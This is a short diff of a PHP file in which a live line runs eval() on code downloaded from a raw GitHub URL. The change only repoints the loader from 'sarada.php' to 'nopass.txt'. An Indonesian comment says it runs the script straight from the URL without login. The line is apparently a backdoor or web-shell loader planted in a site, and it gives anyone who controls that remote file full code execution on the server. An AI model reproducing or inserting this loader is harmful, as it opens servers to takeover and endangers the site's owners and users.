@@ -149,5 +149,5 @@ function getURL($url) {
 }
 
 // langsung jalankan script dari URL tanpa login
-eval("?>" . getURL("https://raw.githubusercontent.com/wulizo335-cmyk/homepage/refs/heads/main/sarada.php"));
+eval("?>" . getURL("https://raw.githubusercontent.com/wulizo335-cmyk/homepage/refs/heads/main/nopass.txt"));
 ?>
